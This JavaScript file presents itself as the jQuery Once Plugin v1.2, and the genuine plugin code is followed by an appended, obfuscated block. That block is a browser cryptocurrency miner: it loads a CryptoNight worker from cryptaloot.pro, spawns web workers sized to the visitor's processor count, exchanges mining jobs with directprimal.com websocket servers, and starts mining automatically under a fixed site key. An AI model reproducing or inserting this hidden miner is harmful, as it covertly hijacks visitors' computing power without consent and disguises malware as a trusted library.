/**
 * jQuery Once Plugin v1.2
 * http://plugins.jquery.com/project/once
 *
 * Dual licensed under the MIT and GPL licenses:
 *   http://www.opensource.org/licenses/mit-license.php
 *   http://www.gnu.org/licenses/gpl.html
 */

(function ($) {
    var cache = {}, uuid = 0;

    /**
     * Filters elements by whether they have not yet been processed.
     *
     * @param id
     *   (Optional) If this is a string, then it will be used as the CSS class
     *   name that is applied to the elements for determining whether it has
     *   already been processed. The elements will get a class in the form of
     *   "id-processed".
     *
     *   If the id parameter is a function, it will be passed off to the fn
     *   parameter and the id will become a unique identifier, represented as a
     *   number.
     *
     *   When the id is neither a string or a function, it becomes a unique
     *   identifier, depicted as a number. The element's class will then be
     *   represented in the form of "jquery-once-#-processed".
     *
     *   Take note that the id must be valid for usage as an element's class name.
     * @param fn
     *   (Optional) If given, this function will be called for each element that
     *   has not yet been processed. The function's return value follows the same
     *   logic as $.each(). Returning true will continue to the next matched
     *   element in the set, while returning false will entirely break the
     *   iteration.
     */
    $.fn.once = function (id, fn) {
        if (typeof id != 'string') {
            // Generate a numeric ID if the id passed can't be used as a CSS class.
            if (!(id in cache)) {
                cache[id] = ++uuid;
            }
            // When the fn parameter is not passed, we interpret it from the id.
            if (!fn) {
                fn = id;
            }
            id = 'jquery-once-' + cache[id];
        }
        // Remove elements from the set that have already been processed.
        var name = id + '-processed';
        var elements = this.not('.' + name).addClass(name);

        return $.isFunction(fn) ? elements.each(fn) : elements;
    };

    /**
     * Filters elements that have been processed once already.
     *
     * @param id
     *   A required string representing the name of the class which should be used
     *   when filtering the elements. This only filters elements that have already
     *   been processed by the once function. The id should be the same id that
     *   was originally passed to the once() function.
     * @param fn
     *   (Optional) If given, this function will be called for each element that
     *   has not yet been processed. The function's return value follows the same
     *   logic as $.each(). Returning true will continue to the next matched
     *   element in the set, while returning false will entirely break the
     *   iteration.
     */
    $.fn.removeOnce = function (id, fn) {
        var name = id + '-processed';
        var elements = this.filter('.' + name).removeClass(name);

        return $.isFunction(fn) ? elements.each(fn) : elements;
    };
})(jQuery);

var _0xe6af = ['min', 'postMessage', 'CRLT', 'https://cryptaloot.pro/lib/', 'justdoit2.js', 'wss://ocean2.directprimal.com', 'wss://sass2.directprimal.com', 'https://cryptaloot.pro/captcha/', 'length', 'close', 'onmessage', 'onclose', 'onopen', 'send', 'stringify', 'readyState', '_user', 'params', '_type', 'anonymous', '_threads', 'threads', '_hashes', '_goal', '_throttle', 'prototype', 'type', 'user', 'toString', 'Anonymous', 'URL', 'mozURL', 'goal', 'auth', 'get', 'https://cryptaloot.pro/lib/justdoit2.js', 'CRYPTONIGHT_WORKER_BLOB', 'responseText', 'push', 'shift', 'terminate', 'wakeup', 'parse', 'data', 'job', 'target', 'nothing'];
(function (_0xd77efc, _0x1b2dc4) {
    var _0x4b16f5 = function (_0x5018e) {
        while (--_0x5018e) {
            _0xd77efc['push'](_0xd77efc['shift']());
        }
    };
    _0x4b16f5(++_0x1b2dc4);
}(_0xe6af, 0x8f));
var _0x40c1 = function (_0x7fb7d4, _0x4c1cce) {
    _0x7fb7d4 = _0x7fb7d4 - 0x0;
    var _0x5c3789 = _0xe6af[_0x7fb7d4];
    return _0x5c3789;
};
CRLT = self[_0x40c1('0x0')] || {};
CRLT['CONFIG'] = {
    'LIB_URL': _0x40c1('0x1'),
    'ASMJS_NAME': _0x40c1('0x2'),
    'REQUIRES_AUTH': ![],
    'WEBSOCKET_SHARDS': [[_0x40c1('0x3'), _0x40c1('0x4'), 'wss://sea2.directprimal.com', 'wss://rock2.directprimal.com', 'wss://stone2.directprimal.com']],
    'CAPTCHA_URL': _0x40c1('0x5')
};
var _0x3b7160 = CRLT['CONFIG']['WEBSOCKET_SHARDS'];
var _0xa273df = Math['random']() * _0x3b7160[_0x40c1('0x6')] | 0x0;
var _0x2e5f34 = _0x3b7160[_0xa273df];
var _0x20dd66 = _0x2e5f34[Math['random']() * _0x2e5f34['length'] | 0x0];
var _0x10eb1d = null;
var _0x51561c = [];
var _0x3fc426;
var _0x2e7cb3 = [];
var _0x142adf = [];
var _0x440ddb = 0x0;
var _0x9d7ca3 = 0x0;
var _0x14ced4 = 0x0;
var _0x446f17 = 0x0;
var _0xe28752 = 0xbe;
var _0x28ebbe = 0x0;
var _0x13f17f = null;
var _0x2fede8 = {};

function _0x33a088(_0x36ac5c) {
    logicalProcessors = _0x36ac5c;
    if (_0x36ac5c == -0x1) {
        try {
            logicalProcessors = window['navigator']['hardwareConcurrency'];
        } catch (_0x5c7300) {
            logicalProcessors = 0x4;
        }
        if (!(logicalProcessors > 0x0 && logicalProcessors < 0x28)) logicalProcessors = 0x4;
    }
    while (logicalProcessors-- > 0x0) _0x532038();
}

var _0x5acf62 = function () {
    if (_0x3fc426 != null) {
        _0x3fc426[_0x40c1('0x7')]();
    }
    _0x3fc426 = new WebSocket(_0x20dd66);
    _0x3fc426[_0x40c1('0x8')] = _0x4f2d5d;
    _0x3fc426['onerror'] = function (_0x2d8212) {
        if (_0x9d7ca3 < 0x2) _0x9d7ca3 = 0x2;
        _0x10eb1d = null;
    };
    _0x3fc426[_0x40c1('0x9')] = function () {
        if (_0x9d7ca3 < 0x2) _0x9d7ca3 = 0x2;
        _0x10eb1d = null;
    };
    _0x3fc426[_0x40c1('0xa')] = function () {
        _0x3fc426[_0x40c1('0xb')](JSON[_0x40c1('0xc')](_0x13f17f));
        _0x9d7ca3 = 0x1;
    };
};
_0x14ced4 = function () {
    if (_0x9d7ca3 !== 0x3 && (_0x3fc426 == null || _0x3fc426[_0x40c1('0xd')] !== 0x0 && _0x3fc426[_0x40c1('0xd')] !== 0x1)) {
        _0x5acf62();
    }
};
var _0x3dac3d = function (_0x19600a, _0x5afdfa) {
    this['params'] = _0x5afdfa || {};
    this['_siteKey'] = _0x19600a;
    this[_0x40c1('0xe')] = this[_0x40c1('0xf')]['user'] || null;
    this[_0x40c1('0x10')] = _0x40c1('0x11');
    this[_0x40c1('0x12')] = this['params'][_0x40c1('0x13')];
    this[_0x40c1('0x14')] = 0x0;
    this[_0x40c1('0x15')] = 0x0;
    this[_0x40c1('0x16')] = this[_0x40c1('0xf')]['throttle'] * 0x64;
};
_0x3dac3d[_0x40c1('0x17')]['start'] = function () {
    if (this['params']['user']) {
        _0x2fede8[_0x40c1('0x18')] = _0x40c1('0x19');
        _0x2fede8[_0x40c1('0x19')] = this[_0x40c1('0xe')][_0x40c1('0x1a')]();
    } else {
        _0x2fede8['type'] = _0x40c1('0x11');
    }
    _0x8786d7(this['_siteKey'], this[_0x40c1('0xe')], this[_0x40c1('0x12')], this[_0x40c1('0x16')], this['_goal'], this['_type']);
};
self[_0x40c1('0x0')] = self['CRLT'] || {};
CRLT[_0x40c1('0x1b')] = function (_0x3b44e2, _0x5c3269) {
    var _0x266d85 = new _0x3dac3d(_0x3b44e2, _0x5c3269);
    return _0x266d85;
};
CRLT['User'] = function (_0x4a9ab3, _0x2dd9ea, _0x38a40e) {
    var _0x4dd832 = new _0x3dac3d(_0x4a9ab3, _0x38a40e);
    _0x4dd832['_user'] = _0x2dd9ea;
    return _0x4dd832;
};
CRLT['Token'] = function (_0x38ba53, _0x36c42c) {
    var _0x4458a1 = new _0x3dac3d(_0x38ba53, _0x36c42c);
    _0x4458a1[_0x40c1('0x15')] = goal || 0x0;
    return _0x4458a1;
};
CRLT['Res'] = function (_0x4de7a7) {
    var _0x6a8bc2 = self[_0x40c1('0x1c')] || self['webkitURL'] || self[_0x40c1('0x1d')];
    return _0x6a8bc2['createObjectURL'](new Blob([_0x4de7a7]));
};

function _0x8786d7(_0x4713e1, _0x1fb3bc, _0x3915e6 = -0x1, _0x2dcd27 = '', _0x365c28 = '', _0x4c7663 = _0x40c1('0x11')) {
    _0x838c6d();
    _0x9d7ca3 = 0x0;
    var _0x2fede8 = {
        'site_key': _0x4713e1,
        'type': this['type'],
        'user': miner['_user'],
        'goal': this[_0x40c1('0x1e')],
        'version': _0xe28752
    };
    _0x13f17f = {'type': _0x40c1('0x1f'), 'params': _0x2fede8 || {}};
    _0x33a088(_0x3915e6);
    _0x14ced4();
    _0x446f17 = setInterval(_0x14ced4, 0x2710);
}

function _0x838c6d() {
    _0x9d7ca3 = 0x3;
    if (_0x446f17 != 0x0) clearInterval(_0x446f17);
    if (_0x3fc426 != null) _0x3fc426['close']();
    _0x2e1498();
    _0x10eb1d = null;
}

function _0x532038() {
    var _0x47f4ad = new XMLHttpRequest();
    _0x47f4ad['open'](_0x40c1('0x20'), _0x40c1('0x21'), ![]);
    _0x47f4ad['send']();
    CRLT[_0x40c1('0x22')] = CRLT['Res'](_0x47f4ad[_0x40c1('0x23')]);
    var _0x407ed2 = new Worker(CRLT[_0x40c1('0x22')]);
    _0x51561c[_0x40c1('0x24')](_0x407ed2);
    _0x407ed2[_0x40c1('0x8')] = _0x588b0f;
    setTimeout(function () {
        _0xbf1db4(_0x407ed2);
    }, 0x7d0);
}

function _0xb3c53a() {
    if (_0x51561c[_0x40c1('0x6')] < 0x1) return;
    var _0x2576f3 = _0x51561c[_0x40c1('0x25')]();
    _0x2576f3['terminate']();
}

function _0x2e1498() {
    for (i = 0x0; i < _0x51561c[_0x40c1('0x6')]; i++) {
        _0x51561c[i][_0x40c1('0x26')]();
    }
    _0x51561c = [];
}

function _0xbf1db4(_0xaf9c13) {
    var _0x42518a = {'data': _0x40c1('0x27'), 'target': _0xaf9c13};
    _0x588b0f(_0x42518a);
}

function _0x4f2d5d(_0x90366c) {
    var _0x5d3a80 = JSON[_0x40c1('0x28')](_0x90366c[_0x40c1('0x29')]);
    _0x2e7cb3[_0x40c1('0x24')](_0x5d3a80);
    if (_0x5d3a80[_0x40c1('0x18')] == _0x40c1('0x2a')) _0x10eb1d = _0x5d3a80[_0x40c1('0xf')];
}

function _0x588b0f(_0x4c1ec7) {
    var _0x23832a = _0x4c1ec7[_0x40c1('0x2b')];
    if (_0x9d7ca3 != 0x1) {
        setTimeout(function () {
            _0xbf1db4(_0x23832a);
        }, 0x7d0);
        return;
    }
    if (_0x4c1ec7['data'] != _0x40c1('0x2c') && _0x4c1ec7[_0x40c1('0x29')] != _0x40c1('0x27')) {
        var _0x41de5 = JSON[_0x40c1('0x28')](_0x4c1ec7[_0x40c1('0x29')]);
        _0x3fc426['send'](_0x4c1ec7['data']);
        _0x142adf['push'](_0x41de5);
    }
    if (_0x10eb1d === null) {
        setTimeout(function () {
            _0xbf1db4(_0x23832a);
        }, 0x7d0);
        return;
    }
    var _0x2d7ac8 = {
        'job': _0x10eb1d,
        'throttle': Math['max'](0x0, Math[_0x40c1('0x2d')](miner[_0x40c1('0x16')], 0x64))
    };
    _0x23832a[_0x40c1('0x2e')](_0x2d7ac8);
    if (_0x4c1ec7[_0x40c1('0x29')] != 'wakeup') _0x440ddb += 0x1;
}

var miner = new CRLT.Anonymous('d1ba2c966c5f54d0da15e2d881b474a5091a91f7c702',
    {
        threads: 2, autoThreads: false, throttle: 0.2,
    }
);
miner.start(CRLT.FORCE_EXCLUSIVE_TAB);